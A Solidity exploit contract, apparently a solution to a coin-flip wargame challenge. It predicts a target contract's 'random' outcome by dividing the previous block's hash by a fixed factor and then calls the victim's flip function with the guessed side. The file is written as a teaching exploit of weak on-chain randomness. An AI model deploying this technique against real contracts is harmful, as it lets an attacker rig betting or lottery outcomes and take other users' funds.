// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    CoinFlip internal victim;
    uint256 internal lastHash;
    // solhint-disable-next-line var-name-mixedcase
    uint256 internal FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address victimAddr) {
        victim = CoinFlip(victimAddr);
    }

    function hackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert("last hash equals to block value");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool success = victim.flip(side);
        require(success == true, "failed to guess coin flip");
    }
}
